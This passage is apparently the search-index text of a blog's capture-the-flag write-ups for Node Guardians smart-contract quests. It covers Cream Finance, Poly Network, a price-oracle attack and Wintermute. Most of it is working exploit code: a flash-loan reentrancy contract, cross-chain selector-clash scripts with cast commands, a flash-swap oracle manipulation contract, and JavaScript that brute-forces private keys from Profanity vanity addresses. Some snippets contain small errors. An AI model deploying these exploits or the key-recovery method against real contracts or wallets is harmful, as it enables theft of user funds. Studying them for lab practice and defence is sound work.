vault; bool pwned; ERC1820Registry registry; // First, we get all the utilities we will need to access during the attack constructor(address _flashLender, address _gold, address _seagold, address _vault, address _registry) { gold = IERC20(_gold); seagold = IERC20(_seagold); flashLender = IERC3156FlashLender(_flashLender); vault = SharkVault(_vault); registry = ERC1820Registry(_registry); } // The attack is in two phases: // - 1) State that the contract implement the interface for the tokenReceived method // in the ERC1820 registry // - 2) Launch the actual attack starting with the flashloan on the Flash Lender contract function attack() public { registry.setInterfaceImplementer(address(0), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this)); uint maxAmount = flashLender.maxFlashLoan(address(gold)); flashLender.flashLoan(this, address(gold), maxAmount, abi.encode(0)); } // Once the loan is authorized by the Flash Lender it calls this function // on the our flash loan attacker contract function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata ) public returns (bytes32) { // Those are almost useless check require(initiator == address(this), 'Wrong initiator'); require(token == address(gold), 'Not gold'); require(fee == 0, 'Fee must be 0'); // First we deposit the gold token into the vault as collateral require(gold.approve(address(vault), amount)); vault.depositGold(amount); // Then we borrow some seagold // if everyting is fine the function to be called is tokenReceived down // bellow // The first borrow is intentionally of 0 since when we are going to // depop from the stack it's going to be the last value... So we'll // have nothing to repay in order to leave the shark vault :) vault.borrow(0 ether); // This is called only once the recursion is over // And it correspond to the withdrawing of the collateral from the // shark vault vault.withdrawGold(amount); // Finally we can approve the gold transfer in order to repay the initial // loan made to the Flash Lender ! require(gold.approve(address(flashLender), amount)); // And don't forget to return the expected hash: return keccak256(\"ERC3156FlashBorrower.onFlashLoan\"); } function tokensReceived( address, address, address, uint256 , bytes calldata, bytes calldata ) external { uint amount = seagold.balanceOf(address(vault)); // classic recursion pattern to prevent infinte loop if (amount == 0) { return; } // since there is 1000 ether of collateral 750 is the max amount we can borrow vault.borrow(750 ether); } } And here is the deployment script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {SharkVault, IERC20, FlashLoan} from \"../src/Attack.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address INSTANCE = vm.envAddress(\"INSTANCE\"); address FLASH_LENDER = vm.envAddress(\"FLASH_LENDER\"); address REGISTRY = vm.envAddress(\"ERC1820REGISTRY\"); vm.startBroadcast(deployerPrivateKey); SharkVault vault = SharkVault(INSTANCE); IERC20 gold = IERC20(vault.gold()); IERC20 seagold = IERC20(vault.seagold()); FlashLoan flashLoan = new FlashLoan(FLASH_LENDER, address(gold), address(seagold), address(vault), REGISTRY); console.logAddress(address(gold)); console.logAddress(address(seagold)); console.logUint(gold.balanceOf(address(vault))); console.logUint(seagold.balanceOf(address(vault))); flashLoan.attack(); console.logUint(seagold.balanceOf(address(vault))); vm.stopBroadcast(); } } forge script script/Shark.s.sol --rpc-url $GOERLI_RPC_URL -vvvv --broadcast --verify ","simple-summary#Simple Summary":"","simple-summary-1#Simple Summary":""},"title":"Cream Finance Rekt"},"/projects/node-guardians/poly-network-rekt-b7b8b11820c249bcb1f96a50fc20d478/":{"data":{"":"","poly-network#\u003cstrong\u003ePoly Network\u003c/strong\u003e":"","privilege-escalation-attack#\u003cstrong\u003ePrivilege Escalation Attack\u003c/strong\u003e":" First here the the boat address on Goerli (the target contract we have to interact with):\ncast call $TRADING_BOAT_GOERLI --rpc-url $RPC_URL_GOERLI \"tradingData()(address)\" \u003e 0xFDDa11C6504db2Cf760F3cb53253D88cF8A5a593 Now we can try to interact with the bridge contract on Fuji chain:\ncast send $TRADING_BOAT_FUJI --private-key $PRIVATE_KEY --rpc-url $RPC_URL_FUJI \"sendShipment(string,bytes32[],uint64,address)(bytes32)\" \"setTrademasters\" [0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6] 0x5 $TRADING_DATA_GOERLI output:\n0x97bc653aac2c7b476cefe65e9df32d34caf31f670e4f36a441000963f8df3a37 Now we can call the offchain trademaster to generate a signature:\nSignature: 0x265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c Let‚Äôs create a script to automate the process:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address PUBLIC_KEY = vm.envAddress(\"PUBLIC_KEY\"); address TRADING_BOAT_GOERLI = vm.envAddress(\"TRADING_BOAT_GOERLI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes memory signature = hex\"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c\"; boat.relayShipment(\"setTrademasters\", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature); vm.stopBroadcast(); } } Now we can relay the message on the goerli chain using the following script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address PUBLIC_KEY = vm.envAddress(\"PUBLIC_KEY\"); address TRADING_BOAT_GOERLI = vm.envAddress(\"TRADING_BOAT_GOERLI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes memory signature = hex\"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c\"; boat.relayShipment(\"setTrademasters\", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature); vm.stopBroadcast(); } } without a surprise the contract revert :\nThis is because the relay function add some params (bytes32[],uint64,address) that we don‚Äôt need and that change the function selector resulting in calling the wrong method on the target contract:\nWe can see on the error message above that we call the selector 0x3b2e7145 whereas we were expecting to call 0xef51774d :\nNow we know that it‚Äôs pretty much straight forward what we have to do: brutforce the method params so that __abi.ecodePacked(_method, (bytes32[], uint64, address) result in the 0xef51774d selector.\nIn order to do that I installed the following program that seems to do the job:\nlink_preview\n\u003e docker run --rm power-clash -a bytes32[],uint64,address -s ef51774d -p setTrademasters \u003e Attempting to find setTrademasters******(bytes32[],uint64,address) match for 0xef51774d in 19770609664 max permutations \u003e Calculating 6277782.5 permutations per second \u003e Found match in 902.78942008s \u003e setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d and Bingo! we have it : setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d\nNow we can do the say process as before but using the new function name.\nHere is the signature we got:\nSignature: 0xeb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c fuji.s.sol\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address TRADING_BOAT_FUJI = vm.envAddress(\"TRADING_BOAT_FUJI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_FUJI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes32 bridgeHash = boat.sendShipment(\"setTrademastersLMuGgO\", params, 5, TRADING_DATA_GOERLI); console.logBytes32(bridgeHash); vm.stopBroadcast(); } } goerli.s.sol\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address PUBLIC_KEY = vm.envAddress(\"PUBLIC_KEY\"); address TRADING_BOAT_GOERLI = vm.envAddress(\"TRADING_BOAT_GOERLI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes memory signature = hex\"eb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c\"; boat.relayShipment(\"setTrademastersLMuGgO\", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature); vm.stopBroadcast(); } } Poly Network Poly Network is a cross-chain protocol that facilitates cross-chain interaction between otherwise disconnected blockchains.\nPoly Network is more advanced than King Baku‚Äôs network. For instance, it uses merkle roots to batch cross-chain transactions, and a multi-signature scheme to improve decentralization.\nHowever similar to our¬†TradingBoat¬†contracts, Poly Network partitions its cross-chain contracts into 2 entities:\n1.¬†EthCrossChainManager¬†which handles the cross-chain verification and execution logic.\n2.¬†EthCrossChainData¬†which manages important information regarding cross-chain trademasters and calls.\nThe partition allows Poly Network to upgrade¬†EthCrossChainManager¬†via proxy, while asserting¬†EthCrossChainData¬†as immutable.\nPrivilege Escalation Attack The attack on¬†TradingBoat¬†and Poly Network is enabled by the same two underlying reasons.\nThe manager contract (TradingBoat/EthCrossChainManager) has access to some privileged external function (setTrademasters()/putCurEpochConPubKeyBytes()). The manager contract can call any function in any contract via selector clashing. Consequently, a malicious attack can search for a selector clash that forces the manager contract to call the privileged external function, and invoke unexpected effects.\nPoly Network has lost $611 million to this form of privilege escalation attack. Fortunately, the hacker has since return the stolen funds for a bug bounty reward."},"title":"Poly Network Rekt"},"/projects/node-guardians/price-oracle-attack-48bb5fd1fcf5428e84266833aecafe4f/":{"data":{"":" Deployment address : 0x1FD0357FcD623C5a1472B7C922CdB7aa262FaEC1\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.20; interface IUniswapV2Pair { function swap( uint amount0Out, uint amount1Out, address to, bytes calldata data ) external; function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast); } interface IUniswapV2Factory { function getPair( address tokenA, address tokenB ) external view returns (address pair); } interface IERC20 { function totalSupply() external view returns (uint); function balanceOf(address account) external view returns (uint); function transfer(address recipient, uint amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint); function approve(address spender, uint amount) external returns (bool); function transferFrom( address sender, address recipient, uint amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } interface IWETH is IERC20 { function deposit() external payable; function withdraw(uint amount) external; } interface IUniswapV2Callee { function uniswapV2Call( address sender, uint amount0, uint amount1, bytes calldata data ) external; } interface GoudaGobelin { function giveGouda() external; } contract Attacker is IUniswapV2Callee { address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; IERC20 private GOLD; IERC20 private GOUDA; GoudaGobelin instance; IUniswapV2Factory private factory = IUniswapV2Factory(UNISWAP_V2_FACTORY); IUniswapV2Pair private immutable pair; // For this example, store the amount to repay uint public amountToRepay; event Log(string message, uint val); constructor(address _gold, address _gouda, address exploited) { pair = IUniswapV2Pair(factory.getPair(address(_gouda), address(_gold))); GOLD = IERC20(_gold); GOUDA = IERC20(_gouda); instance = GoudaGobelin(exploited); } function getReserves() public view returns(uint112, uint112) { (uint112 r0, uint112 r1, ) = pair.getReserves(); return (r0, r1); } function getPair() public view returns(address) { return address(pair); } function flashSwap(uint goldAmount) external { // Need to pass some data to trigger uniswapV2Call bytes memory data = abi.encode(address(GOLD), address(this)); // amount0Out is Gouda, amount1Out is Gold pair.swap(goldAmount, 0, address(this), data); } // This function is called by the GOUDA/GOLD pair contract function uniswapV2Call( address sender, uint amount1, uint, bytes calldata data ) external { require(msg.sender == address(pair), \"not pair\"); require(sender == address(this), \"not sender\"); (address tokenBorrow) = abi.decode(data, (address)); // Your custom code would go here. For example, code to arbitrage. require(tokenBorrow == address(GOLD), \"token borrow != GOLD\"); uint fee = ((amount1 * 3) / 997) + 1; amountToRepay = amount1 + fee; uint goldBalance = GOLD.balanceOf(address(tokenBorrowpair)); uint goudaBalance = GOUDA.balanceOf(address(pair)); uint goudaPrice = goldBalance * 1 gwei / goudaBalance; uint ThisGoldBalance = GOLD.balanceOf(address(this)); uint ThisGoudaBalance = GOUDA.balanceOf(address(this)); emit Log(\"amount1\", amount1); emit Log(\"Pair goldBalance\", goldBalance); emit Log(\"Pair goudaBalance\", goudaBalance); emit Log(\"Pair goudaPrice\", goudaPrice); emit Log(\"This goudaBalance\", ThisGoudaBalance); emit Log(\"This goldBalance\", ThisGoldBalance); instance.giveGouda(); goldBalance = GOLD.balanceOf(address(pair)); goudaBalance = GOUDA.balanceOf(address(pair)); goudaPrice = goldBalance * 1 gwei / goudaBalance; ThisGoldBalance = GOLD.balanceOf(address(this)); ThisGoudaBalance = GOUDA.balanceOf(address(this)); emit Log(\"amount1\", amount1); emit Log(\"Pair goldBalance\", goldBalance); emit Log(\"Pair goudaBalance\", goudaBalance); emit Log(\"Pair goudaPrice\", goudaPrice); emit Log(\"This goudaBalance\", ThisGoudaBalance); emit Log(\"This goldBalance\", ThisGoldBalance); // Flashswap fees require(GOUDA.approve(address(pair), 1 ether), 'approve failed.'); GOUDA.transfer(address(pair), 10000000000000000000000); // Repay GOLD.transfer(address(pair), amount1); } } bookmark"},"title":"Price Oracle Attack"},"/projects/node-guardians/wintermute-rekt-d0fd4609147941e6af7fcc68ef81da6a/":{"data":{"":" Level: https://rekt.news/wintermute-rekt-2\nHere is the contract we have to break:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.19; contract UndeadHorde { address public constant LADY_WHITEFROST = 0x0DEaD582fa84de81e5287132d70d9a296224Cf90; bool public isActive = true; mapping(address =\u003e bool) public infested; function infestDead(address _target) external { require(isActive); require(_fromLady(), \"We only answer to our Queen Mother...\"); require(_isDead(_target), \"Target is still alive...\"); infested[_target] = true; } // So we have to find a way to call this function // The only possible way to do so is by being LADY_WHITEFROST // So we have to find the private key associated with her address function releaseArmy() external { require(_fromLady(), \"We only answer to our Queen Mother...\"); isActive = false; } function _fromLady() private view returns (bool) { return msg.sender == LADY_WHITEFROST; } function _isDead(address _target) private pure returns (bool) { uint160 prefix = uint160(_target) \u003e\u003e 140; return prefix == 0x0dead; } } First let‚Äôs take a look to the Vanity address generator that we have: find-more-dead.js\nconst { BigNumber } = require(\"ethers\"); const { arrayify, keccak256, zeroPad } = require(\"ethers/lib/utils\"); const { Worker } = require(\"worker_threads\"); const { CURVE } = require(\"@noble/secp256k1\"); const MAX_UINT16 = 65535; // 2**16 const NUM_OF_THREADS = 3; const K = \"0xc01ddeadc01ddeadc01ddead\"; // Generate a random private key `p` const seed = Math.floor(Math.random() * MAX_UINT16); // 1 out of 65535 possible seeds const privateKey = BigNumber.from(keccak256(seed)); // Determinitic private key generation console.log(`Seed: ${seed}`); // Start threads running `find-dead.js` for (let i = 0; i \u003c NUM_OF_THREADS; i++) { // Each thread is given a private key `p + (i * K)` const delta = BigNumber.from(K).mul(i); // ---- thread 0: privKey + delta0 // | // ---- thread 1: privKey + delta1 // | // ---- thread 2: privKey + delta2 const seedKey = zeroPad(arrayify(privateKey.add(delta).mod(CURVE.n)), 32); const thread = new Worker(\"./find-dead.js\", { workerData: { seedKey: seedKey }, }); thread.on(\"message\", (msg) =\u003e { console.log(msg); }); } Then in each thread we have the following script: find-dead.js\nconst { BigNumber } = require(\"ethers\"); const { getAddress: checksumAddress, hexDataSlice, keccak256, } = require(\"ethers/lib/utils\"); const { Point } = require(\"@noble/secp256k1\"); const { parentPort, workerData } = require(\"worker_threads\"); // Calculate new point `P` from seed key `p` const seedKey = workerData.seedKey; let newPoint = Point.fromPrivateKey(seedKey); // seed pub key for (let i = 1; ; i++) { // Increment new point `P` (i.e. `P \u003c- P + G`) newPoint = newPoint.add(Point.BASE); // part of the set of the candidate pub key // Infer address of `P` const newAddress = hexDataSlice( keccak256(hexDataSlice(\"0x\" + newPoint.toHex(), 1)), 12, ); // If address is vanity address... if (newAddress.startsWith(\"0x0dead\")) { // Infer the private key (i.e. `p + i`) const deadKey = BigNumber.from(seedKey).add(i); // Send back to parent process to print parentPort.postMessage( `\\nPrivate Key: ${deadKey.toHexString()}\\ \\nAddress: ${checksumAddress(newAddress)}`, ); } } We can notice that there are no more than MAX_UINT16 per thread (3 threads) private key possible, which is a reasonable amount number of private to generate.\nOnce we have all the possible private keys it‚Äôs not more difficult to generate all the public key associated (aka seed public key).\nHere is a script to generate all possible public key seeds:\nconst fs = require(\"node:fs\"); const { BigNumber } = require(\"ethers\"); const { arrayify, keccak256, zeroPad } = require(\"ethers/lib/utils\"); const { Point } = require(\"@noble/secp256k1\"); const { CURVE } = require(\"@noble/secp256k1\"); const MAX_UINT16 = 65535; const K = \"0xc01ddeadc01ddeadc01ddead\"; const d0 = BigNumber.from(K).mul(0); const d1 = BigNumber.from(K).mul(1); const d2 = BigNumber.from(K).mul(2); // let map = new Map(); // Generates all possible private keys (65535 * 3 = 196 605) for (let i = 0; i \u003c MAX_UINT16; i++) { const privateKey = BigNumber.from(keccak256(i)); const pvKey0 = zeroPad(arrayify(privateKey.add(d0).mod(CURVE.n)), 32); const pvKey1 = zeroPad(arrayify(privateKey.add(d1).mod(CURVE.n)), 32); const pvKey2 = zeroPad(arrayify(privateKey.add(d2).mod(CURVE.n)), 32); // const content = `${s0}\\n${s1}\\n${s2}\\n`; const seedPbKey0 = Point.fromPrivateKey(new Uint8Array(pvKey0)); const seedPbKey1 = Point.fromPrivateKey(new Uint8Array(pvKey1)); const seedPbKey2 = Point.fromPrivateKey(new Uint8Array(pvKey2)); const content = `\"${seedPbKey0.toHex()}\": [${pvKey0}],\\n\"${seedPbKey1.toHex()}\": [${pvKey1}],\\n\"${seedPbKey2.toHex()}\": [${pvKey2}],\\n`; fs.appendFileSync(\"./out.log\", content, () =\u003e {}); } Once the keys are generated we can put then into a file. My idea was to generate a mapping such that : pubKey ‚áí privKey\nSo that if we manage to find the seed public key of the vanity address of LADY_WHITEFROST it‚Äôs very easy to get the associated private key and so we break the level !\nOnce the script has finished to run we end up with a ~50Mb file that contains all the mapped keys, then we can convert the file to a js object so it will be easier to load it into memory: map.js\nconst data = { \"04b793ec11629accadfd51835c82654391fad3f7489af36440155403e366dc677808fa587ed7576c1274e4fcdf886789b72b52de5e1eed3907500d9d4d3f8aa1fb\": [ 188, 54, 120, 158, 122, 30, 40, 20, 54, 70, 66, 41, 130, 143, 129, 125, 102, 18, 247, 180, 119, 214, 101, 145, 255, 150, 169, 224, 100, 188, 201, 138, ], \"046d7e35af8d3626c3b9a4846f7a3eb7bb4da9b33dc29dbd1c0254f9ea4e25b7d64753c9655cbcd5974904b0dd51a0b5fb11a7dbd676031706472c8d794800abe0\": [ 188, 54, 120, 158, 122, 30, 40, 20, 54, 70, 66, 41, 130, 143, 129, 125, 102, 18, 247, 181, 55, 244, 68, 63, 191, 180, 136, 142, 36, 218, 168, 55, ], // ... // ... // ... }; module.exports = { data }; Now that we are done with this part we can go back to the address:\nLADY_WHITEFROST = 0x0DEaD582fa84de81e5287132d70d9a296224Cf90; We have to recover a public key from the address. The process implies that we use a transaction made by the said address. We can do that looking on Etherscan and I chose the following one:\n0xf81d53b9d2fa44bb0c31913b55eeabf38492d187fc2fe162a6359850c2320b97 which has the followin associated encoded data (click on Get Raw Tx Hex on the etherscan more button of the transaction):\nFrom here we have to retrieve the r,s,v value, we can use ABDK TollKit to do that from web interface:\nAfter, that I used the following script to recover the public from the transaction details: ransactionToPublicKey.js\nconst { ethers } = require(\"ethers\"); async function recover(tx) { const expandedSig = { r: tx.r, s: tx.s, v: tx.v, }; const signature = ethers.utils.joinSignature(expandedSig); const txData = { gasLimit: tx.gasLimit, value: tx.value, nonce: tx.nonce, data: tx.data, chainId: tx.chainId, to: tx.to, // you might need to include this if it's a regular tx and not simply a contract deployment type: tx.type, maxFeePerGas: tx.maxFeePerGas, maxPriorityFeePerGas: tx.maxPriorityFeePerGas, }; const rsTx = await ethers.utils.resolveProperties(txData); const raw = ethers.utils.serializeTransaction(rsTx); // returns RLP encoded tx const msgHash = ethers.utils.keccak256(raw); // as specified by ECDSA const msgBytes = ethers.utils.arrayify(msgHash); // create binary hash return { publicKey: ethers.utils.recoverPublicKey(msgBytes, signature), address: ethers.utils.recoverAddress(msgBytes, signature), }; } recover({ r: \"0x14ad83bdfc9bb697562faf6fd876b3fcda0e08bfc91589ad7e140d6e6f7f2138\", s: \"0x36c1ad13b175a65fc23749d201fa382b5169e4f0ca0bbc041140077e19e4c803\", v: \"0xf81d53b9d2fa44bb0c31913b55eeabf38492d187fc2fe162a6359850c2320b97\", gasLimit: 21000, nonce: 0, value: 100000000000000, data: \"\", chainId: 5, to: \"0xA73dB9CFB00F43241f35d6462124C11B72C765CF\", type: 2, maxFeePerGas: 5870556900, maxPriorityFeePerGas: 1500000000, }).then((res) =\u003e console.log(res)); which gave me the following output :\nLet‚Äôs go ! We have the public key of LADY_WHITEFROST, the only thing left to do is bruteforcing the public key so that we can retrieve the seed public key which will gave us the associated private key thanks to our mapping.\nHere is the bruteforce attack script:\nconst { BigNumber } = require(\"ethers\"); const { Point } = require(\"@noble/secp256k1\"); const { getAddress: checksumAddress, hexDataSlice, keccak256, } = require(\"ethers/lib/utils\"); console.log(\"Loading pub/priv key pairs into memory...\"); const { data: map } = require(\"./map.js\"); console.log(\"Data keys has been loaded\"); // We start from the public key we found let newPoint = Point.fromHex( \"04077029792b56144069fac2787ca35fad37f7f0634236ba02e307bff5a2f120e1c1484a687dc468e671eef339d1437d02d51949973ccfd29f33efe9aa4b9a6017\", ); for (let i = 1; ; i++) { // Then we do the opposite operation made to find the Vanity address (add -\u003e substract) newPoint = newPoint.subtract(Point.BASE); const hexNewPoint = newPoint.toHex(); // if the public key exist in the db then it's the public key seed used // to generate the vanity public key! if (map[hexNewPoint] !== undefined) { const seedKey = new Uint8Array(map[hexNewPoint]); console.log(seedKey); const deadKey = BigNumber.from(seedKey).add(i); // We print out the private key found console.log( `i = ${i}\\nPrivate Key: ${deadKey.toHexString()}\\nPublic key: ${hexNewPoint}`, ); break; } } Here we have it!\nUsefull links:\nA vulnerability disclosed in Profanity, an Ethereum vanity address tool Private key safety It took the wintermute hacker 5 days to brute force an ETH Vanity Address‚Ä¶ Profanity-brute-force The Profanity Address Hack ‚Äî How are Vanity Addresses Generated? https://vast.ai/ A Deep Dive of HOW Profanity Caused Wintermute to Lose $160M Get public key of any ethereum account ECDSA: Elliptic Curve Signatures How to get sender‚Äôs Ethereum address and public key from signed transaction ethers.js Recover public key from contract deployment via v,r,s values Can we generate public key from ethereum public address? Some screen shot from my research during the quest:\nTx = 0x02f87105808459682f0085015de996e482520894a73db9cfb00f43241f35d6462124c11b72c765cf865af3107a400080c001a014ad83bdfc9bb697562faf6fd876b3fcda0e08bfc91589ad7e140d6e6f7f2138a036c1ad13b175a65fc23749d201fa382b5169e4f0ca0bbc041140077e19e4c803 From = 0x0DEaD582fa84de81e5287132d70d9a296224Cf90 To = 0xA73dB9CFB00F43241f35d6462124C11B72C765CF r = 0x14ad83bdfc9bb697562faf6fd876b3fcda0e08bfc91589ad7e140d6e6f7f2138 s = 0x36c1ad13b175a65fc23749d201fa382b5169e4f0ca0bbc041140077e19e4c803 v = 0xf81d53b9d2fa44bb0c31913b55eeabf38492d187fc2fe162a6359850c2320b97 "},"title":"Wintermute Rekt"}}